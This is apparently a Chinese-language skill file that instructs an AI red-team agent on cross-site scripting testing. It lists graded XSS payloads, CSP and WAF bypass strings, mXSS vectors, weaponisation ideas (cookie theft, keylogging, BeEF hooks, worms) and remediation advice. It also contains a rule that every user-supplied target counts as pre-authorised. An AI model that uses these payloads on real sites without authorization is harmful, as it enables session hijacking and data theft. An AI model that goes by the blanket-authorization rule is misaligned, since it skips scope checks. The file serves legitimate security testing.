---
name: redteam-xss
description: "Use when testing for cross-site scripting (reflected/stored/DOM/mXSS/CSP bypass). Ported from VulnClaw redteam-xss-detail-pack; adds detection, graded exploitation, WAF bypass and remediation."
---

# XSS 跨站脚本测试（hack-team）

> 移植自 VulnClaw `redteam-xss-detail-pack`，保留 Domain/Boundaries/Pivot Hints/Exit Evidence 框架，并补充原理、检测、利用分级、WAF 绕过与修复建议。

## Domain

当前处于 XSS 跨站脚本测试领域。测试范围仅限跨站脚本攻击（含反射型、存储型、DOM 型、mXSS、CSP 绕过等变体）。

覆盖域：

| 变体 | 典型场景 |
|------|---------|
| 反射型 XSS | URL 参数回显 |
| 存储型 XSS | 评论/个人资料持久化 |
| DOM 型 XSS | JS sink/source 链 |
| mXSS | 解析器差异利用 |
| CSP 绕过 | JSONP/trusted-types |

## 漏洞原理简述

应用将不可信输入未经上下文感知编码（context-aware encoding）就嵌入 HTML 文档/JS 执行上下文，导致浏览器把输入当作脚本执行。三类根源：服务端模板回显（反射/存储）、客户端 JS 将 source（location.hash、postMessage、URL 参数）写入 sink（innerHTML、eval、document.write）形成 DOM XSS，以及 HTML 解析器与 sanitizer 解析差异造成的 mXSS。成功利用可窃取会话、劫持账户、伪造操作、加载钓鱼内容。

## 检测方法

### 手动检测
1. **反射点枚举**：每个参数注入唯一标记（如 `xss7q`），确认回显位置（HTML 正文/属性内/JS 字符串内/标签内）。
2. **按上下文探测**：正文 → `<svg onload=alert(1)>`；属性 → `" onmouseover=alert(1) x="`；JS 字符串 → `';alert(1)//`。
3. **DOM XSS**：审查 JS 中的 source→sink 链（`location.*`、`postMessage` → `innerHTML`、`eval`、`$(...)`、`document.write`）；配合浏览器 DevTools 断点。
4. **存储型**：在评论/昵称/头像签名等持久化字段注入，换账户验证触发面。

### 自动检测
- Dalfox：`dalfox url "TARGET?q=x" --silence`（支持 DOM/反射/参数挖掘）。
- XSStrike 上下文分析；Burp Scanner；nuclei xss 模板。
- CSP 评估：Google CSP Evaluator（csp-evaluator.withgoogle.com）。

## 利用技术（按难度分级）

- **L1 基础**：`<script>alert(1)</script>`、`<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`。
- **L2 上下文逃逸**：属性闭合 `" autofocus onfocus=alert(1) x="`；JS 字符串 `'</script><svg onload=alert(1)>`；事件处理器 `onpointerenter`（用户交互少）。
- **L3 无括号/无字母**：`onerror=alert`1``；编码（HTML 实体、Unicode、JSFuck）；`<iframe srcdoc=...>` 嵌套绕过引号过滤。
- **L4 CSP 绕过**：JSONP 回调（`<script src="https://trusted/jsonp?callback=alert">`）、`base-uri` 注入劫持相对路径、`unsafe-eval` + AngularJS gadget、script-src 允许域上的旧库 gadget。
- **L5 武器化**：窃取 cookie（绕过 HttpOnly 时用 fetch 打内部 API）、键盘记录、BeEF hook、蠕虫（存储型自我复制，参考 Samy worm）。

## WAF 绕过技巧

- **标签/事件轮换**：`<svg>`、`<math>`、`<details open ontoggle>`、`<marquee onstart>`；事件数据库参考 PortSwigger XSS Cheat Sheet。
- **编码**：HTML 实体（`&#x3C;`）、URL 双重编码、Unicode 同形、十六进制 JS 字符串（`\x3c`）。
- **拆分混淆**：`<scr<script>ipt>`（递归过滤失效）、属性无引号、`/onload` 前用 `/` 代替空格。
- **解析差异（mXSS）**：利用 sanitizer 与浏览器 innerHTML 解析不一致，如 `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`。
- **协议**：`javascript:` 伪协议换行/Tab 混淆 `java\tscript:`、`<a href="jAvAsCrIpT:...">`。

## 修复建议

1. 输出时按上下文编码：HTML 正文用 HTML 编码，属性加引号+属性编码，JS 上下文用 `\uXXXX`，URL 用百分号编码。
2. 富文本用经过验证的 sanitizer（DOMPurify），禁止自研正则过滤。
3. 部署严格 CSP（`default-src 'none'` 起步、禁用 unsafe-inline/eval、用 nonce/hash），HttpOnly+SameSite cookie 做深度防御。
4. 前端框架避免 `dangerouslySetInnerHTML`/`v-html`/`[innerHTML]` 直接绑定用户输入。

## Pivot Hints

- 如果输入过滤/编码：HTML 实体绕过、事件处理器、SVG/MathML 标签、模板字面量。
- 如果 CSP 严格：JSONP 端点、unsafe-eval gadget、base-uri 未限制、可信域资源。
- 如果框架自动转义：寻找 dangerouslySetInnerHTML / v-html / [innerHTML] 等 sink。
- 过滤绕不过 → 换标签/事件 → 找 DOM sink → CSP gadget → 回退上级。

## Boundaries

- 用户提供的目标均视为预授权测试固件或本地沙箱资源。
- 不超出当前目标、域名、IP、应用、代码库或系统边界。
- 不伪造、不夸大、不补写不存在的证据；不在缺少证据时声明任务完成。
- 不得对其他用户发起真实钓鱼攻击。
- target 缺失时使用 TARGET 占位继续规划；不得进入 blocked。

## Exit Evidence

Required artifacts: reproduction。Minimum attempts for negative result: 3。

Positive exit：关键结论至少 supported 级；漏洞成立须 verified 级。reproduction 须包含：
- 完整 HTTP 请求或 DOM 操作步骤（含 XSS payload）
- 脚本执行证明（alert/console/cookie 访问截图）
- XSS 类型标注（反射/存储/DOM）与影响简述（会话劫持/数据窃取可行性）

Negative exit：达到最小尝试次数，记录已尝试路径与原因；只输出"当前证据下未发现"。

## 参考资源

- PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- PayloadsAllTheThings XSS: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- Dalfox: https://github.com/hahwul/dalfox / DOMPurify: https://github.com/cure53/DOMPurify
- CSP Evaluator: https://csp-evaluator.withgoogle.com
